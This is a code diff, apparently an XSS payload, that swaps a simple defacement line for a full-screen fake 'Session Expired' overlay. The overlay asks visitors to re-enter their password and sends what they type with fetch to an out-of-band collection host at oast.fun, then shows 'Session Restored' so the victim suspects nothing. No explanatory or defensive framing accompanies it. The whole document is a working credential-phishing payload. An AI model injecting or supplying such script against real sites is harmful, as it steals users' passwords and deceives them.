@@ -1,3 +1,31 @@
 <script>
-top.document.body.innerHTML = '<h1>Pwned</h1>';
+let overlay = document.createElement('div');
+overlay.style.position = 'fixed';
+overlay.style.top = 0;
+overlay.style.left = 0;
+overlay.style.width = '100%';
+overlay.style.height = '100%';
+overlay.style.background = 'rgba(0,0,0,0.6)';
+overlay.style.zIndex = 999999;
+overlay.style.display = 'flex';
+overlay.style.flexDirection = 'column';
+overlay.style.alignItems = 'center';
+overlay.style.justifyContent = 'center';
+overlay.innerHTML = `
+    <div style="background:white;padding:20px;border-radius:8px;text-align:center;font-family:sans-serif;max-width:300px;">
+        <h3>Session Expired</h3>
+        <p>Please re-enter your password to continue</p>
+        <input type="password" id="phishPass" style="width:100%;padding:8px;margin-top:10px;">
+        <button id="phishBtn" style="margin-top:10px;padding:8px 16px;">Continue</button>
+    </div>
+`;
+document.body.appendChild(overlay);
+
+document.getElementById('phishBtn').onclick = () => {
+    let pass = document.getElementById('phishPass').value;
+    fetch("http://zxoedymekhstpruvwboal9f78tyjukijo.oast.fun?pwd=" + encodeURIComponent(pass))
+    .catch(()=>{});
+    overlay.innerHTML = `<h2 style="color:white;">Session Restored</h2>`;
+    setTimeout(()=>overlay.remove(),1500);
+};
 </script>
